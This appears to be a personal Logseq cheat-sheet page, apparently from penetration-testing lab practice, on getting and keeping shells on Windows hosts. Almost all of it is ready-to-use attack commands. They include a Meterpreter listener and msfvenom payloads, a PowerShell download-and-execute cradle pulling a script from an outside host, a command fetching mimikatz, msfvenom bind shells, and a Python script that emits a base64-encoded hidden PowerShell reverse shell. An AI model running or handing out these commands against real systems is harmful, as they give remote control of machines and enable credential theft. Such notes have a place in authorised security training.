public:: true

- Run program in background from powershell, like bind shells or other agents.
	- ```powershell
	  start-job { C:\users\chris\bind.exe }
	  ```
- Meterpreter
	- Start the listener
	  ```bash
	  msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.183;set LPORT 8444;run;"
	  ```
	- Prepare the agent in powershell
		- ```bash
		  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.183 LPORT=4444 -f psh > meterpreter.ps1
		  ```
		- Using `-f psh` generates a powershell script which perform an *in-memory injection* (Remote Process Memory Injection) and the specified payload
		  logseq.order-list-type:: number
		- Using `-f powershell` only generates the payload
		  logseq.order-list-type:: number
- Download and execute from powershell
	- ```powershell
	  powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.183:8000/meterpreter.ps1');meterpreter"
	  ```
- Download to disk with powershell
	- ```powershell
	  powershell -c "Invoke-WebRequest 'http://192.168.45.183:8000/mimikatz.exe' -OutFile 'mimikatz.exe'"
	  
	  # OR
	  
	  Invoke-WebRequest "http://192.168.45.183:8000/mimikatz.exe" -OutFile "mimikatz.exe"
	  ```
- Bind Shell
	- `cmd` bind shell
	  ```bash
	  msfvenom -p windows/x64/shell_bind_tcp PORT=4444 -f exe > bind_cmd_4444.exe
	  ```
		- I suggest to always use `cmd` over `powershell` as initial shell because some interactive tools (like [[Mimikatz]] ) might misbehave on powershell. Then you can always upgrade to powershell by typing `powershell`.
	- `powershell` bind shell
	  ```bash
	  msfvenom -p windows/x64/powershell_bind_tcp PORT=4444 -f exe > bind_ps_4444.exe
	  ```
- `reverse-shell-windows.py`
	- ```python
	  #!/usr/bin/python3
	  #
	  # Usage: python3 reverse-shell-windows.py YOUR_IP 4444
	  #
	  
	  import sys
	  import base64
	  
	  payload = '$client = New-Object System.Net.Sockets.TCPClient("' + sys.argv[1] + '",' + sys.argv[2] + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
	  
	  print(payload)
	  
	  print("")
	  
	  cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
	  
	  print(cmd)
	  
	  ```